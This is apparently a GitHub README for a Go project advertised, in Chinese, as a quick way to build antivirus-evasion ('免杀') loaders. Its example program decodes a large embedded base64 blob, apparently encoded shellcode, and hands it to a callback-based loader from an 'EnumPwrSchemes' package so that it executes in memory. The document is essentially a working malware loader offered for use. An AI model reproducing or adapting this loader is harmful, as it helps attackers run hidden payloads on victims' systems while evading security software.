# Go-Packer-Loaders
快速Go建你的免杀项目



# Example
```
package main

import (
	"encoding/base64"
	"fmt"
	Loaders "github.com/ImCoriander/Go-Packer-Loaders/pkg/EnumPwrSchemes"

)

// =================加密===============
var BaseStr = "6GoCAAACNNEI5LYdc4twYA7C9v//AEQwJA9EAiQP4vbFLfz+/oC/5+YRmZ2d6CKQq0vlQ2svr46+cnY3xeXv4ef1+//wBfK1ROTpvXXpIl+YpbgaXeVtbUFlDaO5+U3PIxW/aZ/ejAPUc8QOQmL4WXc0rC91VKA5E7cROUBYECaMGatieH2ZDbEFq0R0DyFnYvmABmL985mLabWLLr/ZV2exjXFdDTS6YDdwLLhAb8t38VyoHDa9E6xhY9/CFUlTgPlJNZTlwTTE8pVMrE79ZExKOaspmsYRb2quLhVobAWlXcqjZTN0HDn2gJ4zjIL31DO7H3L02elgqtHkTlOvs52r30oi+21wG7VVTV1H3Y1EHabrIntx1T+PLl1YRoMQeNdgoWOVlRGaeE6yHBpIGehbxwvQ9Fue7MDxzftc8nJY6WI6uTS+UJYoh4miqXjQU4DkyvDDhd+F5zYXsfhuhtrQu76Bn3bLS9uCLkI2/ycay67wDu6oLFptyl6hcNMDx4PDPSf8c1I4ylzgoJqDX9ocyuwvhY7niahMaEVRMpaq1OahYFZEeIPqgO96BNGGxcP3zTsXxPrfVSRJFbCeFL2lWP7xEItObT0DNGOFomMpEmm7bS1DZ5tSWdEUGmIb63A6NQZ0Ty9+PcHac/1YOuA2O8nAWqA5P6gl5PuYF2JoSOK7njjC3EMrTJKDqnF1yX0g5yFzXFVBs5tmYcdddmGOaFwBpAH2Rmo1j3Vet720w/0uNoIDSYYYzwOG8jVoTVuIBTMw9qiuV530F0pyWtMd6gtT7BuLyIm5MWckRSWp48eug8Chybnwvw9L9MtagQI/gFo/gXIEI3dScYFCCHWP5373Ugz/4g=="

//=================加密===============

func main() {

	// 解码base64字符串
	data, err := base64.StdEncoding.DecodeString(BaseStr)
	if err != nil {
		fmt.Println("解码失败:", err)
		return
	}
	Loaders.Callback(data)

}

```
